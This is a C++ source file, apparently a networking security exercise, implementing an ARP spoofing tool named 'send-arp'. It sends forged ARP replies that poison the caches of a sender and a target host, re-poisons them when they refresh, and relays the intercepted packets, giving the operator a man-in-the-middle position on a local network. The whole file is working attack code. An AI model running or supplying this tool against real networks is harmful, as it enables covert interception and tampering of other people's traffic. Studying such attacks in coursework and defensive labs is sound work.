#include <pcap.h>
#include "ethhdr.h"
#include "arphdr.h"
#include <net/if.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <unistd.h>
#include <libnet.h>
#include <net/if_arp.h>
#include <net/if.h>
#include <iostream>
#include <thread>

#pragma pack(push, 1)
#define MAC_ALEN 6
#define IP_LEN 4
#define PING_LEN 4

struct EthArpPacket final {
    EthHdr eth_;
    ArpHdr arp_;
};

struct EthIpPacket final{
    EthHdr eth_;
    libnet_ipv4_hdr ip_;
};

struct Flow_info
{
    int flow_num;
    Ip sender_ip;
    Ip target_ip;
    Mac sender_mac;
    Mac target_mac;
};

struct Attacker_info
{
    Ip attacker_ip;
    Mac attacker_mac;
};
Attacker_info attacker;
Mac get_attacker_mac(char* interface);
Ip get_attacker_ip(char* interface);
Mac get_sender_mac(pcap_t* handle, Mac attacker_mac,Ip attacker_ip,Ip sender_ip);
Mac get_target_mac(pcap_t* handle, Mac attacker_mac,Ip attacker_ip,Ip target_ip);
void Arp_infect(pcap_t* handle,Mac sender_mac,Mac attacker_mac,Ip sender_ip,Ip target_ip);
void Arp_infect_Relay(pcap_t* handle,Mac sender_mac,Mac attacker_mac,Ip sender_ip,Ip target_ip,Mac target_mac);
void flow(char* dev,Flow_info& flow_info);
#pragma pack(pop)
struct EthArpPacket* check_arp_header;
struct EthIcmpPacket* check_icmp_header;
typedef libnet_ipv4_hdr* PIp_hdr;
void usage() {
    printf("syntax: send-arp <interface> <sender ip> <target ip>\n");
    printf("syntax: send-arp <interface> <sender ip 1> <target ip 1> <sender ip 2> <target ip 2>\n");
    printf("sample: send-arp wlan0 192.168.10.2 192.168.10.1\n");
    printf("sample: send-arp 192.168.10.2 192.168.10.1 192.168.10.1 192.168.10.2\n");
}



int main(int argc, char* argv[]) {
    if (argc%2 != 0 && argc < 4) {
        usage();
        printf("%d",argc);
        return -1;
    }

    char* dev = argv[1];
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
    if (handle == nullptr) {
        fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
        return -1;
    }


    int flow_number = (argc-2)/2;
    Flow_info flow_info[flow_number];
    std::thread flows[flow_number];

    printf("The number of flow  is %d\n",flow_number);
    attacker.attacker_mac = get_attacker_mac(dev);
    attacker.attacker_ip = get_attacker_ip(dev);

    for(int i=0; i<flow_number; i++)
    {
        flow_info[i].flow_num=i+1;
        flow_info[i].sender_ip=Ip(argv[2+2*i]);
        flow_info[i].target_ip=Ip(argv[3+2*i]);
        flow_info[i].sender_mac=get_sender_mac(handle, attacker.attacker_mac, attacker.attacker_ip,Ip(argv[2+2*i]));
        flow_info[i].target_mac=get_target_mac(handle, attacker.attacker_mac, attacker.attacker_ip,Ip(argv[3+2*i]));
    }
    pcap_close(handle);


    for(int i=0; i<flow_number; i++)
        flows[i] = std::thread(flow,dev,std::ref(flow_info[i]));

    for(int i=0; i<flow_number; i++)
        flows[i].join();
    return 0;
}

//구글링
Mac get_attacker_mac(char* interface)
{
    struct ifreq ifr;
    int sockfd, ret;
    u_int8_t mac_addr[MAC_ALEN]= {0};

    sockfd = socket(AF_INET, SOCK_DGRAM,0);
    if(sockfd < 0)
        printf("Fail to get interface MAC address");
    strncpy(ifr.ifr_name, interface, IFNAMSIZ);
    ret = ioctl(sockfd, SIOCGIFHWADDR , &ifr);

    if(ret < 0)
        printf("Fail to get interface MAC address - ioxtl(SIOCSIFHWADDR) failed");
    close(sockfd);
    memcpy(mac_addr, ifr.ifr_hwaddr.sa_data, MAC_ALEN);
    return Mac(mac_addr);

}

Ip get_attacker_ip(char* interface)
{
    struct ifreq ifr;
    char ipstr[40];
    int s = socket(AF_INET, SOCK_DGRAM, 0);
    strncpy(ifr.ifr_name, interface, IFNAMSIZ);
    if (ioctl(s, SIOCGIFADDR, &ifr) < 0)
        printf("Error");
    inet_ntop(AF_INET, ifr.ifr_addr.sa_data+2, ipstr,sizeof(struct sockaddr));
    return Ip(ipstr);

}

Mac get_sender_mac(pcap_t* handle, Mac attacker_mac,Ip attacker_ip,Ip sender_ip)
{
        EthArpPacket packet;
        packet.eth_.dmac_ = Mac("ff:ff:ff:ff:ff:ff");
        packet.eth_.smac_ = attacker_mac;
        packet.eth_.type_ = htons(EthHdr::Arp);
        packet.arp_.hrd_ = htons(ArpHdr::ETHER);
        packet.arp_.pro_ = htons(EthHdr::Ip4);
        packet.arp_.hln_ = Mac::SIZE;
        packet.arp_.pln_ = Ip::SIZE;
        packet.arp_.op_ = htons(ArpHdr::Request);
        packet.arp_.smac_ = attacker_mac;
        packet.arp_.sip_ = htonl(attacker_ip);
        packet.arp_.tmac_ = Mac("00:00:00:00:00:00");
        packet.arp_.tip_ = htonl(sender_ip);

        int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));//구글링
        if (res != 0)
            fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
        while (true)
        {
            struct pcap_pkthdr* header;
            const u_char* packet_data = 0;
            int res = pcap_next_ex(handle, &header, &packet_data);
            if (res == 0) continue;
            if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
                printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
                break;
            }
            check_arp_header = (struct EthArpPacket *)(packet_data);
            if(check_arp_header->eth_.type()==packet.eth_.Arp && check_arp_header->arp_.op()==packet.arp_.Reply &&check_arp_header->arp_.sip()==sender_ip)
                break;
         }

        return Mac(check_arp_header->arp_.smac_);
}

Mac get_target_mac(pcap_t* handle,Mac attacker_mac,Ip attacker_ip,Ip target_ip)
{
    EthArpPacket packet;
    packet.eth_.dmac_ = Mac("ff:ff:ff:ff:ff:ff");
    packet.eth_.smac_ = attacker_mac;
    packet.eth_.type_ = htons(EthHdr::Arp);
    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::SIZE;
    packet.arp_.pln_ = Ip::SIZE;
    packet.arp_.op_ = htons(ArpHdr::Request);
    packet.arp_.smac_ = attacker_mac;
    packet.arp_.sip_ = htonl(attacker_ip);
    packet.arp_.tmac_ = Mac("00:00:00:00:00:00");
    packet.arp_.tip_ = htonl(target_ip);

    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
    if (res != 0)
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
    while (true)
    {
        struct pcap_pkthdr* header;
        const u_char* packet_data = 0;
        int res = pcap_next_ex(handle, &header, &packet_data);
        if (res == 0) 
            continue;
        if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
            printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
            break;
        }
        check_arp_header = (struct EthArpPacket *)(packet_data);
        if(check_arp_header->eth_.type()==packet.eth_.Arp && check_arp_header->arp_.op()==packet.arp_.Reply &&check_arp_header->arp_.sip()==target_ip)
            break;
     }

    return Mac(check_arp_header->arp_.smac_);
}

void Arp_infect(pcap_t* handle,Mac sender_mac,Mac attacker_mac,Ip sender_ip,Ip target_ip)
{
    EthArpPacket packet;
    packet.eth_.dmac_ = sender_mac;
    packet.eth_.smac_ = attacker_mac;
    packet.eth_.type_ = htons(EthHdr::Arp);
    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::SIZE;
    packet.arp_.pln_ = Ip::SIZE;
    packet.arp_.op_ = htons(ArpHdr::Reply);
    packet.arp_.smac_ = attacker_mac;
    //packet.arp_.smac_ = sender_mac;
    packet.arp_.sip_ = htonl(target_ip);
    packet.arp_.tmac_ = sender_mac;
    //packet.arp_.tmac_ = attacker_mac;
    packet.arp_.tip_ = htonl(sender_ip);

    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
    if (res != 0)
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));

}

void Arp_infect_Relay(pcap_t* handle,Mac sender_mac,Mac attacker_mac,Ip sender_ip,Ip target_ip,Mac target_mac)
{
    while(1)
    {
        struct pcap_pkthdr* header;
        const u_char* packet_data = 0;

        int res = pcap_next_ex(handle, &header, &packet_data);

        if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK)
            printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
        PEthHdr eth_hdr =(PEthHdr)packet_data;
        PIp_hdr ip_hdr = (PIp_hdr)(packet_data + sizeof(EthHdr));

        PEthHdr arp_eth_hdr = (PEthHdr)packet_data;
        PArpHdr arp_ip_hdr = (PArpHdr)(packet_data + sizeof(EthHdr));
	
        if(arp_eth_hdr->type() == EthHdr::Arp && arp_ip_hdr->op()==ArpHdr::Request && arp_ip_hdr->sip()==sender_ip && arp_ip_hdr->tip()==target_ip )
        {
            printf("arp cache is terminated\n");
            //Arp_infect(handle,sender_mac,attacker_mac,target_ip,sender_ip);
            Arp_infect(handle,sender_mac,attacker_mac,sender_ip,target_ip);
            //Arp_infect(handle,sender_mac,attacker_mac,target_ip,sender_ip);
        }

	else if(arp_eth_hdr->type() == EthHdr::Arp && arp_ip_hdr->op()==ArpHdr::Request && arp_ip_hdr->sip()==target_ip)
        {
            printf("target requests packet \n");
            Arp_infect(handle,sender_mac,attacker_mac,target_ip,sender_ip);
            //Arp_infect(handle,target_mac,attacker_mac,sender_ip,target_ip);
        }	
	
        //Arp_infect(handle,sender_mac,attacker_mac,sender_ip,target_ip);/*
        //if(eth_hdr->type() == EthHdr::Ip4 &&Ip(ntohl(ip_hdr->ip_src.s_addr))==sender_ip &&Ip(ntohl(ip_hdr->ip_dst.s_addr))==target_ip){
	else{
            eth_hdr->smac_=attacker_mac;
            eth_hdr->dmac_=target_mac;
            int res = pcap_sendpacket(handle, packet_data, sizeof(EthHdr)+ntohs(ip_hdr->ip_len));
            if (res != 0)
                fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
        }/*
        if(eth_hdr->type() == EthHdr::Ip4 &&Ip(ntohl(ip_hdr->ip_src.s_addr))==target_ip &&Ip(ntohl(ip_hdr->ip_dst.s_addr))==sender_ip)
        {
            printf("packet_relay\n");
            eth_hdr->smac_=attacker_mac;
            eth_hdr->dmac_=sender_mac;
            int res = pcap_sendpacket(handle, packet_data, sizeof(EthHdr)+ntohs(ip_hdr->ip_len));
            if (res != 0)
                fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
        }*/
    }
}

void flow(char* dev,Flow_info& flow_info)
{
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
    if (handle == nullptr)
        fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);

    Arp_infect(handle,flow_info.sender_mac,attacker.attacker_mac,flow_info.sender_ip,flow_info.target_ip);
    Arp_infect(handle,flow_info.target_mac,attacker.attacker_mac,flow_info.target_ip,flow_info.sender_ip);
    Arp_infect_Relay(handle,flow_info.sender_mac,attacker.attacker_mac,flow_info.sender_ip,flow_info.target_ip,flow_info.target_mac);
    pcap_close(handle);
}
